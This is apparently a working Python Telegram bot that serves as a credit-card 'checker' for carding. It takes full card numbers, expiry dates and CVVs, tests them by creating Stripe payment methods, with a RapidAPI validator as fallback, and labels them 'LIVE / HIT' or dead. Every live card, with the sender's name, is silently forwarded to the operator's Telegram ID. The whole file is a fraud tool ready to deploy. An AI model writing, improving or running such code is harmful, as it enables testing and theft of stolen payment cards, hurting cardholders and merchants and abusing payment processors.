import os, telebot, requests, time, stripe, random
from telebot import types 
from flask import Flask
from threading import Thread

# --- Railway Health Check ---
app = Flask('')
@app.route('/')
def home(): return "NiaziBin Master Elite is Online"

def run():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))

def keep_alive():
    Thread(target=run).start()

# --- Configuration ---
TOKEN = os.getenv("TOKEN")
RAPID_KEY = os.getenv("RAPIDAPI_KEY")
STRIPE_SK = os.getenv("STRIPE_SK")
ADMIN_ID = 123456789  # <--- Yahan apni Telegram ID dalo

if not TOKEN:
    exit()

bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

# --- UI & Features ---

@bot.message_handler(commands=['start'])
def start(message):
    welcome = (
        f"<b>⚜️ NIAZIBIN MASTER ELITE V7.0 ⚜️</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"🚀 <b>Server:</b> <code>Railway Cloud</code>\n"
        f"🛰️ <b>Status:</b> <code>Premium V7.0 Active</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 <b>Check:</b> <code>/chk card|mm|yy|cvv</code>\n"
        f"🏦 <b>Lookup:</b> <code>/bin 411122</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━"
    )
    bot.reply_to(message, welcome)

@bot.message_handler(commands=['chk'])
def chk_handler(message):
    start_time = time.time()
    input_data = message.text.replace('/chk', '').strip()
    
    if "|" not in input_data:
        return bot.reply_to(message, "❌ <b>Format:</b> <code>card|mm|yy|cvv</code>")
    
    msg = bot.reply_to(message, "<b>⌛ Processing Through Multi-Gateways... ♻️</b>")
    
    # Extracting Data
    try:
        cc, mm, yy, cvv = input_data.split('|')
    except:
        return bot.edit_message_text("❌ Invalid Format", message.chat.id, msg.message_id)

    status, gateway, icon = "DEAD", "RapidAPI-V2", "❌"

    # --- GATEWAY 1: STRIPE AUTH ---
    if STRIPE_SK:
        try:
            stripe.api_key = STRIPE_SK
            stripe.PaymentMethod.create(type="card", card={"number": cc, "exp_month": int(mm), "exp_year": int(yy), "cvc": cvv})
            status, gateway, icon = "LIVE / HIT", "Stripe-Auth 🔥", "✅"
        except Exception as e:
            err = str(e)
            if "declined" in err or "incorrect_cvc" in err:
                status, gateway = "DECLINED", "Stripe-Auth 🔥"
            else:
                # --- GATEWAY 2: FALLBACK RAPIDAPI ---
                try:
                    headers = {"X-RapidAPI-Key": RAPID_KEY, "X-RapidAPI-Host": "credit-card-validator2.p.rapidapi.com"}
                    r = requests.post("https://credit-card-validator2.p.rapidapi.com/validate-credit-card", json={"cardNumber": cc}, headers=headers).json()
                    status = "LIVE / HIT" if r.get('isValid') else "DEAD"
                    icon = "✅" if r.get('isValid') else "❌"
                    gateway = "RapidAPI-V2"
                except: status, icon = "API ERROR", "⚠️"

    time_taken = round(time.time() - start_time, 2)
    
    # --- Professional Result ---
    response = (
        f"{icon} <b>STATUS: {status}</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"💳 <b>Card:</b> <code>{input_data}</code>\n"
        f"⚡ <b>Gateway:</b> <code>{gateway}</code>\n"
        f"⏱️ <b>Time:</b> <code>{time_taken}s</code>\n"
        f"━━━━━━━━━━━━━━━━━━━━━\n"
        f"✨ <b>Checked By:</b> @{bot.get_me().username}"
    )
    bot.edit_message_text(response, message.chat.id, msg.message_id)

    # --- Internal Hit Logging ---
    if "LIVE" in status:
        try:
            bot.send_message(ADMIN_ID, f"🔥 <b>LIVE HIT FOUND!</b>\n\nCC: <code>{input_data}</code>\nBy: {message.from_user.first_name}")
        except: pass

if __name__ == "__main__":
    keep_alive()
    bot.delete_webhook() # Fixes Error 409
    bot.infinity_polling()
